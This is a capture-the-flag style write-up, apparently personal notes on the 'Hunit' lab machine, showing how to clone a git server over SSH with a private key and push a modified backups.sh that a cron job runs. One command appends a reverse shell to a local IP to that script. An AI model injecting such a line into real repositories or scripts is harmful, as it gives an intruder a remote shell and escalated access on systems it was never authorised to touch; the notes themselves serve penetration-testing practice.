# Git Repository

The point of this is to successfuly make changes to a repository that is being opened somewhere else. I encountered this in Hunit. In Hunit, there was a cron job that used or pulled backup.sh from this git-server. However we did not have sufficient permissions as the current user to make the changes to the repository, so we had to use ssh to make changes as another user.&#x20;

If we are in the machine locally, and we find the github server directory we can clone it like this:

![](<../../../.gitbook/assets/image (58).png>)

As we can see by simply going to that directory we can see so many things that it is really hard to make sense out of this information.&#x20;

```
[dademola@hunit ~]$ git clone file:///git-server/ 
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

Once we clone it we can simply navigate to it and see the contents.&#x20;

In order to make changes we have to make a Git identity like this:e

```
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

To clone the repository remotely over ssh we would do it as such:&#x20;

```
kali@kali:~$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/<git-server-name>
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

And make our own identity like this:

```
kali@kali:~$ cd git-server
kali@kali:~/git-server$ git config --global user.name "kali"
kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
```

```
kali@kali:~$ cd git-server
kali@kali:~/git-server$ git config --global user.name "kali"
kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
kali@kali:~/git-server$ echo "sh -i >& /dev/tcp/192.168.118.8/8080 0>&1" >> backups.sh 
kali@kali:~/git-server$ chmod +x backups.sh
```

To commit those changes we would do it like this.&#x20;

```
kali@kali:~/git-server$ git add -A
kali@kali:~/git-server$ git commit -m "pwn"
[master cb7104c] pwn
 1 file changed, 1 insertion(+)
 mode change 100644 => 100755 backups.sh
kali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.120.204:/git-server
   b50f4e5..0212790  master -> master
kali@kali:~/git-server$ 
```

So if there is a file that is being used as a cron tab and we have credentials to make changes to a repository over ssh this is how we do it. If there is any other way we know that the principle is to make changes to the files someway.

<details>

<summary>Hunit</summary>

[https://app.gitbook.com/s/x7pGGgP03A1fT5JYoK4x/priv-escalation](https://app.gitbook.com/s/x7pGGgP03A1fT5JYoK4x/priv-escalation)

</details>
